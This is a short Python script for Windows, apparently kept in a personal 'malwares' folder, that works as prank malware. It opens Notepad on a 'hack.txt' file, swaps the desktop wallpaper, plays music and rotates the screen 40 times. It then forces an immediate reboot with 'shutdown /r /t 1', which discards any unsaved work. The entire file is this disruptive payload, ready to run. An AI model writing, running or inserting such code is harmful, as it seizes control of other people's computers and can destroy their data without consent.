import os
import subprocess
import ctypes
from playsound import playsound
import rotatescreen
import time

screen = rotatescreen.get_primary_display()

# Open notepad
appname = 'Notepad.exe'
filename = 'hack.txt'

subprocess.Popen([appname, filename])

# Wallpaper change
SPI_WALLPAPER = 0x14
SPIF_UPDATINGFILE = 0x2 # Instantly updates the file

sourc = r"C:\Users\Ankit Mitra\Desktop\malwares\hack.jpg"
ctypes.windll.user32.SystemParametersInfoW(SPI_WALLPAPER,0,sourc,SPIF_UPDATINGFILE)

# Play Music
playsound(r"C:\Users\Ankit Mitra\Desktop\malwares\The_Ghost - Niviro-[AudioTrimmer.com].mp3")

# Rotates screen
for rotates in range(41):
    time.sleep(1)
    screen.rotate_to(rotates * 90 % 360)

# Restart
os.system("shutdown /r /t 1")